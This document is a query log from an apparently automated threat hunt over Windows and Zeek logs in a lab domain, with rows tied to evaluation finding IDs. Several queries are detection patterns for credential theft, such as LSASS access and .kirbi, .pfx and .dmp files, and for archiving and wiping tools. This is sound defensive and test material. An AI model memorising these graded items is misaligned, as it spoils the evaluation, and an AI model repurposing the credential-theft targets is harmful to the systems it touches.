| q-a3bc8f09e0 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:32:41.290000+00:00", "size": 100, "sub_field": "process.pare… | 61 |  |
| q-da04ddf0b9 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:32:41.290000+00:00", "size": 100, "sub_field": "process.executable"} | 249 |  |
| q-5762f16081 | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:32:41.290000+00:00", "size": 100, "sub_field": "process… | 63 |  |
| q-2ec7246456 | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:32:41.290000+00:00", "size": 100, "sub_field": null} | 192 |  |
| q-d4ef6ecdca | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:05.681000+00:00", "size": 100, "sub_field": "process.parent.ex… | 359 |  |
| q-804a741928 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:05.681000+00:00", "size": 100, "sub_field": "process.executable"} | 1276 |  |
| q-be5f016c1d | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:05.681000+00:00", "size": 100, "sub_field": "process.pare… | 370 |  |
| q-92d126be4d | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:05.681000+00:00", "size": 100, "sub_field": null} | 8602 |  |
| q-c10848084d | pivot step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" AND (process.executable LIKE \"*csc.exe\" OR process.executable LIKE \"*victim*\" OR process.executable LIKE \"*hostui*\" … | 15 | F58 |
| q-d648cde740 | pivot step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND (file.path LIKE \"*Temp*\" OR file.path LIKE \"*victim*\" OR file.path LIKE \"*.dll\" OR file.path LIKE \"*.pfx\" OR … | 171 |  |
| q-64eb7f9448 | pivot step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, host.name, user.name, powershell.script_block_text, _id, _index \| SORT @timestamp ASC \| LIMIT… | ERROR |  |
| q-042d759897 | pivot step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"nashua.dmevals.local\" AND (process.executable LIKE \"*python*\" OR process.executable LIKE \"*Rar*\" OR process.executable LIKE \"*sdelete*\" OR p… | 17 | F59 |
| q-ab9297b7d9 | pivot step 3 | get_fields | {"dataset": "windows.powershell", "prefix": ""} | None |  |
| q-e5ec5a553c | pivot step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND host.name == \"nashua.dmevals.local\" \| KEEP @timestamp, host.name, winlog.event_data.TargetImage, winlog.event_data.GrantedAccess, winlog.event_data.CallTrace,… | ERROR |  |
| q-acf6baa0f5 | pivot step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"nashua.dmevals.local\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp ASC"} | 11 | F59 |
| q-0e5f6f1bd3 | pivot step 4 | get_fields | {"dataset": "windows.sysmon", "prefix": "winlog"} | None |  |
| q-6ac635dbd1 | pivot step 5 | get_fields | {"dataset": "windows.sysmon", "prefix": "win"} | None |  |
| q-0c21f05933 | pivot step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp ASC"} | 146 | F67 |
| q-dcbf9d42a4 | pivot step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (win.TargetImage LIKE \"*lsass*\" OR win.TargetImage LIKE \"*sam*\" OR win.TargetImage LIKE \"*security*\") \| KEEP @timestamp, host.name, user.name, win.SourceI… | 326 | F61, F64 |
| q-8179237d64 | pivot step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (win.TargetFilename LIKE \"*.pfx\" OR win.TargetFilename LIKE \"*.kirbi\" OR win.TargetFilename LIKE \"*.dmp\" OR win.TargetFilename LIKE \"*sam*\" OR win.Target… | 11 | F57, F62 |
| q-c2294b39a9 | pivot step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHl"} | None | F58 |
| q-99f2263d45 | pivot step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-3d671a92da | pivot step 7 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND @timestamp > \"2020-05-02T03:01:50Z\" \| KEEP @timestamp, user.name, win.ScriptBlockText, _id, _index \| SORT @… | 108 | F57, F62, F65, F66 |
| q-461fe82ece | pivot step 8 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND @timestamp > \"2020-05-02T03:06:42Z\" \| KEEP @timestamp, user.name, win.ScriptBlockText, _id, _index \| SORT @… | 67 | F56 |
| q-284b86b8fd | pivot step 8 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND host.name == \"nashua.dmevals.local\" \| KEEP @timestamp, process.executable, win.DestinationIp, win.DestinationHostname, win.DestinationPort, _id, _index \| SORT… | 428 |  |
| q-da24497a42 | pivot step 9 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None |  |
| q-8e44141b1c | pivot step 9 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None | F60, F63 |
| q-88b7ea0219 | pivot step 9 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"nashua.dmevals.local\" AND (process.executable LIKE \"*python*\" OR process.executable LIKE \"*powershell*\" OR process.executable LIKE \"*Rar*\" … | 29 | F59 |
| q-6a15714455 | pivot step 10 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"3\" AND process.executable LIKE \"*python*\" \| KEEP @timestamp, process.executable, win.DestinationIp, win.DestinationPort, _id… | 348 |  |
| q-f3600f2a82 | pivot step 10 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND win.TargetFilename LIKE \"*victim*\" \| KEEP @timestamp, process.executable, win.TargetFilename, _id, _index \| SORT … | 0 |  |
| q-88caa883ef | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr9"} | None |  |
| q-72b81e7af5 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRZ7r-"} | None |  |
| q-4b743571b3 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYbCZ"} | None |  |
| q-6636990aee | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPY7AN"} | None |  |
| q-b068f21655 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-723bcdd2d8 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLrb"} | None |  |
| q-a8f34b9b3a | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-73da83bacc | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVdnF"} | None |  |
| q-a261e467a0 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHl"} | None |  |
| q-88b900550d | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqZ"} | None |  |
| q-94afea1f6f | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4z4i"} | None |  |
| q-2a6556a634 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l6o"} | None |  |
| q-81088b37d5 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTwk"} | None |  |
| q-b737250536 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByDVjze"} | None |  |
| q-ff9b3b3173 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1qSj"} | None |  |
| q-d8f0581938 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnnmUud"} | None |  |
| q-3f622f142b | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTy7"} | None |  |
| q-3c0dbf05b6 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-5fb800e409 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-4870318eda | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYLCT"} | None |  |
| q-d262135169 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-56b1190d53 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-31ba0e5156 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByUbwus"} | None |  |
| q-645f2dbda5 | pivot step 12 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBosxOR1"} | None | F67 |
| q-aea12eac2b | pivot step 12 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30hQJ"} | None | F68 |
| q-22fcaa00a3 | pivot step 12 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBowNwU"} | ERROR |  |
| q-5885dd4884 | pivot step 13 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwNwU"} | None | F66, F69 |
| q-47aed1b2d5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-0af6dd839c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-3b67811378 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-51109e5966 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-bfb99ccd24 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVtlI"} | None |  |
| q-d168176d8f | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByUbwus"} | None |  |
| q-91c89466ec | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoLO1t-"} | None |  |
| q-7a78d3dbf1 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-212af7c03a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-d00afe360c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-672c6e88a2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv695R"} | None |  |
| q-24fd7fea14 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBizx7sV"} | None |  |
| q-1105392105 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBox14nu"} | None |  |
| q-521835107f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBox14nu"} | None |  |
| q-6bd55c4b28 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBumw-cX"} | None |  |
| q-c97c0d5374 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBumw-cX"} | None |  |
| q-fc4078e14d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoglALi"} | None |  |
| q-1bb1595a48 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-839d4dea4a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-5895951649 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None |  |
| q-c7cea7cd69 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnxyHFB"} | None |  |
| q-0f342ea670 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnvvDAD"} | None |  |
| q-77379e391b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnvvDAD"} | None |  |
| q-aa640a3abf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnaXZbG"} | None |  |
| q-5cd925390b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnkjXIW"} | None |  |
| q-a9e95de15c | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1J"} | None |  |
| q-b66e9bb014 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnFCvgF"} | None |  |
| q-51a187f916 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None |  |
| q-bae95874fa | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None |  |
| q-28d64b5e57 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTy7"} | None |  |
| q-92fc58131e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTy7"} | None |  |
| q-f7ac7579a5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRt"} | None |  |
| q-6b7c5f679e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-0b4fa7e451 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-0cb7c1641b | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-186f2fbef6 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-19c28fea86 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-79b3e89cd2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-f896392ece | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-3246e359e7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-36eaa5b5f1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-9788260530 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoWbcdc"} | None |  |
| q-b673150f24 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoWbcdc"} | None |  |
| q-a3567febfb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-0b49aacc7f | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-9e0eb5bb7c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqZ"} | None |  |
| q-8a5f317797 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-5d49119e0e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-786ad15eab | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-3c25b5f617 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-98b42b39e7 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0P"} | None |  |
| q-2ad9723bac | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdLx28"} | None |  |
| q-86cf5f5300 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuiuXgG"} | None |  |
| q-e7f93a3c44 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuiuXgG"} | None |  |
| q-8e980c77e5 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-9419481135 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-fe5d2a159b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-724a18ed59 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0i"} | None |  |
| q-61beaa8b2a | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-be6999aad4 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdLx3n"} | None |  |
| q-5984d6edc6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-dfcbf8c98b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppFX"} | None |  |
| q-bb0ad03526 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppFY"} | None |  |
| q-6834d45c3e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnfdUsq"} | None |  |
| q-cb73d4c41e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnQM1oU"} | None |  |
| q-e2f9d49d7a | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-19b0c6b09e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-3f3fac12c1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-b950a2e484 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1KRR"} | None |  |
| q-bee1aead49 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-611d9d9322 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-128df13502 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-b6310420f9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-4ac04092d1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-85b5049a56 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-1dc75a95bf | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaboE"} | None |  |
| q-f8f37edd5d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1KRR"} | None |  |
| q-a1779f6950 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBov08Fg"} | None |  |
| q-48f0b28caf | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR9H"} | None |  |
| q-1c9fc109ce | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR9H"} | None |  |
| q-7d26044982 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8V"} | None |  |
| q-4586d6ac4f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8V"} | None |  |
| q-65e49433f8 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR85"} | None |  |
| q-910a93b9db | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR_2"} | None |  |
| q-a02088d12b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8KXgx"} | None |  |
| q-2a78bf6394 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8KXgx"} | None |  |
| q-1e6b7d2c74 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fR"} | None |  |
| q-0492e125d0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBouzOll"} | None |  |
| q-a5bc111fb3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBouzOll"} | None |  |
| q-51baea6ddf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-2ad5c00882 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-1d10e38695 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-652e8116be | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-d25072228b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-1f0f0023e3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-b350c0717e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-4522882e77 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr6"} | None |  |
| q-b6abdcd186 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr9"} | None |  |
| q-de0e9264b2 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-17004a12fa | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy1B5lB"} | None |  |
| q-877c505454 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-9588dd3f30 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-4ff11707de | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-6b263665cd | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR8i"} | None |  |
| q-3e6cc58e75 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBur1GH0"} | None |  |
| q-07fd84c0a1 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBur1GH0"} | None |  |
